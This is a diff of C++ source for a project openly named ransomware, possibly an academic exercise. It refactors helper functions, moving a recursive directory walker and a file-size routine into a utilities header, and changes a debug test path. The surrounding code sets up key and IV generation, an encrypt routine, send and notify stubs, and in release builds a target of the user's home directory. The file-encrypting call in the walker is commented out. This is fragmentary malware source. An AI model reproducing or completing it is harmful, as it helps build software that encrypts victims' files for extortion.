@@ -6,7 +6,7 @@
 #include "config.h"
 #include "Encryption.h"
 #include <fstream>
-
+#include "Utils.h"
 #ifdef _WIN32
 #	include <windows.h>
 #	include <Urlmon.h>
@@ -26,20 +26,19 @@ using std::string;
 
 void encrypt(string path);
 
-void iterate(const path& parent);
-void process(const path& path);
+
 string get_username();
 string get_home();
 void send();
 void notify();
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
-size_t getFileSize(const string path);
+
 
 int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 
 #ifdef DEBUG
-	string path = "c:\\rans\\236499\\Squanched\\Debug\\rans.txt";
+	string path = "C:\\Programming\\RansomWare\\236499\\test\\rans.txt";
 #else
 	string path = get_home();
 #endif
@@ -61,18 +60,6 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 
-size_t getFileSize(const string path)
-{
-	std::ifstream plaintext;
-	plaintext.open(path,std::ios::binary);
-	if(!plaintext.is_open()) {
-		return 0;
-	}
-	plaintext.seekg(0, std::ios::end);
-	std::streampos plaintextLen = plaintext.tellg();
-	plaintext.close();
-	return plaintextLen;
-}
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
 {
@@ -182,26 +169,9 @@ void encrypt(string path)
 
 
 
-void iterate(const path& parent) {
-	string path;
-	directory_iterator end_itr;
 
-	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
-		path = itr->path().string();
 
-		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
-			iterate(path);
-		}
-		else {
-			process(path);
-		}
-	}
-}
 
-void process(const path& path) {
-	std::cout << "processing " << path.string() << std::endl;
-	//encrypt(path.string());
-}
 
 //string get_username() {
 //#ifdef _WIN32
